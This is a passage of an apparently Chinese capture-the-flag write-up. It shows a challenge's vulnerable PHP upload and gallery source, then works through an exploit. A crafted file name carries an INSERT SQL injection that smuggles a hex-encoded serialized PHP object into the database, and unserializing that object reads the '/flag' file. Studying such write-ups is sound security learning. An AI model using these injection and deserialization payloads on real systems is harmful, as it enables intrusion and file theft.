class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br></div></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>//show.php

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Show Images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./style.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>content-type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html;charset=UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>center<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Your images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>The function of viewing the image has not been completed, and currently only the contents of your image name can be saved. I hope you can forgive me and my colleagues and I are working hard to improve.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;./helper.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;delete_all&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;delete_all&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token double-quoted-string string">&quot;true&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">show</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$con</span><span class="token punctuation">;</span>
	<span class="token comment">//连接数据库</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;pic_base&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
   			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Connect MySQL Fail:&quot;</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token comment">//获取图片信息</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;SELECT * FROM images&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;attr&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
					<span class="token comment">//获取每一行的信息</span>
					<span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;attr&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token comment">//反序列化attr</span>
					<span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
		        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;id=&quot;</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; filename=&quot;</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; path=&quot;</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;path&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
		    <span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
		    <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;DELETE FROM images&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>show.php?delete_all=true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Delete All Images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>upload.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Upload Images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br></div></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>//upload.php

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Image Upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./style.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>content-type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html;charset=UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>center<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://i.loli.net/2019/10/06/i5GVSYnB1mZRaFj.png<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>300</span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>150</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>center<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>upload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span> <span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./show.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>You can view the pictures you uploaded here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;./helper.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">upload</span> <span class="token keyword">extends</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;error&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload file failed.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
		<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p>文件上传的过程中filename可控，在check()方法中直接利用没做任何处理的filename来生成title，并直接插入数据库，可以造成INSERT注入从而插入我们的恶意信息。</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720182944.png" alt="image-20200720182919673"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720182951.png" alt="image-20200720182903470"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//正常语句
INSERT INTO images(`title`,`filename`,`ext`,`path`,`attr`) VALUES('a','b','c','d','e')

//通过控制filename来改变tile的值来造成注入
//filename = 1','1','1','1','1')#.jpg -&gt; tile = 1','1','1','1','1')#

//注入之后的结果
INSERT INTO images(`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1','1')#','b','c','d','e')
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>那该怎么利用呢？服务器会将图片的高度和宽度以序列化字符串的形式保存在images的attr字段中，并且在show.php中还会进行反序列化：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720183646.png" alt="image-20200720183614013"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720183827.png" alt="image-20200720183827368"></p> <p>在helper.php中存在能造成文件读取的方法：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720183956.png" alt="image-20200720183955931"></p> <p>那么就利用这一点，利用INSERT注入来插入我们构造的恶意序列化字符串，从而进行文件读取。生成payload：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;pic/&quot;</span><span class="token punctuation">;</span>
	<span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">True</span><span class="token punctuation">;</span> 
	<span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/flag&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>因为服务器会进行一个字符串替换的操作，所以需要对生成的payload进行相应的处理来保证序列化字符串格式正确</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720184503.png" alt="image-20200720184503541"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//替换前
O:6:&quot;helper&quot;:3:{s:9:&quot;*folder&quot;;s:4:&quot;pic/&quot;;s:9:&quot;*ifview&quot;;b:1;s:9:&quot;*config&quot;;s:5:&quot;/flag&quot;;}
//替换后
O:6:&quot;helper&quot;:3:{s:9:&quot;\0\0\0folder&quot;;s:4:&quot;pic/&quot;;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>再利用INSERT注入来插入payload从而进行反序列化，修改filename为<code>1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a22002a00666f6c646572223b733a343a227069632f223b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg</code></p> <p><strong>这里有个小tips:</strong></p> <ul><li><strong>0x开头的数据在数据库中会被自动解析成字符串，所以需要对我们替换好的pyload进行一次hex转换(bin2hex()函数)</strong></li></ul> <p>这样一来，插入后的语句就变成了：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>INSERT INTO images(`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a22002a00666f6c646572223b733a343a227069632f223b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#','1','1','1','1')
